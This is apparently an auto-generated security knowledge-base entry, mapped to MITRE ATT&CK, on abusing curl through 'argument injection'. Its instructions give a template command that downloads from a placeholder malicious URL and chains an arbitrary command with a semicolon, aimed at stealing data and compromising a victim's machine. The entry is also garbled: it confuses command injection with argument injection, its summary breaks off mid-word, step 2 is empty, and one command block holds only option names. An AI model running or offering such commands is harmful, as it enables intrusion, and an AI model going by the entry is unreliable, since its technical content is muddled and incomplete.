---
id: fa93e06a-1442-42d9-822b-e4dfbd91769a
name: CURL Argument Injection
type: procedure
verified: false
submitted: false
created_at: '2023-04-06T03:55:54.061742+00:00'
updated_at: '2023-04-06T03:55:54.076055+00:00'
tactics:
- '[[Execution|TA0002 - Execution]]'
techniques:
- '[[Command-Line Interface|T1059 - Command-Line Interface]]'
tags:
- '[[Argument Injection]]'
- '[[CURL]]'
- '[[List of exposed commands]]'
commands:
- '[[Download file]]'
- '[[Get Google homepage]]'
---

# CURL Argument Injection

## Summary

CURL is a powerful command-line tool for transferring data to or from a server. However, it is possible to abuse its command-line arguments to execute arbitrary commands on the victim's machine. This technique is known as argument injection. An attacker can use this technique to execute malicious c

## Description

# Description

CURL is a powerful command-line tool for transferring data to or from a server. However, it is possible to abuse its command-line arguments to execute arbitrary commands on the victim's machine. This technique is known as argument injection. An attacker can use this technique to execute malicious commands on the victim's machine, which can lead to data theft, system compromise or other malicious activities. The attacker can use various methods to inject malicious arguments, such as manipulating input data or crafting specially-crafted URLs.

 

## Requirements

1. Access to the victim's machine

1. Knowledge of CURL command-line arguments

1. Ability to manipulate input data or craft specially-crafted URLs

 

## Defense

1. Validate and sanitize user input to prevent malicious arguments

1. Use command-line argument whitelisting to restrict the allowed arguments for CURL

1. Monitor system logs and network traffic for suspicious activity related to CURL

 

## Objectives

1. Execute arbitrary commands on the victim's machine

1. Steal sensitive data

1. Compromise the victim's system

 

# Instructions

1. curl <malicious_url> --output <file> ; <malicious_command>

 



**Code**: [[curl]]



> This command downloads a file from a malicious URL and saves it to a file on the victim's machine. It then executes a malicious command using the semicolon (;) operator. The attacker can replace <malicious_url> with a specially-crafted URL that contains malicious arguments. They can also replace <file> with any filename of their choosing, and <malicious_command> with any command they want to execute on the victim's machine.



**Command** ([[Get Google homepage]]):

```bash
curl https://www.google.com/
```



2. 

 



**Code**: [[-o, --output <file>
-O, --remote-name]]



> 



**Command** ([[Download file]]):

```bash
-o, --output <file>
-O, --remote-name
```



## MITRE ATT&CK Mapping

### Tactics

- [[Execution|TA0002 - Execution]]

### Techniques

- [[Command-Line Interface|T1059 - Command-Line Interface]]

## Commands Used

- [[Download file]]
- [[Get Google homepage]]

## Tags

- [[Argument Injection]]
- [[CURL]]
- [[List of exposed commands]]


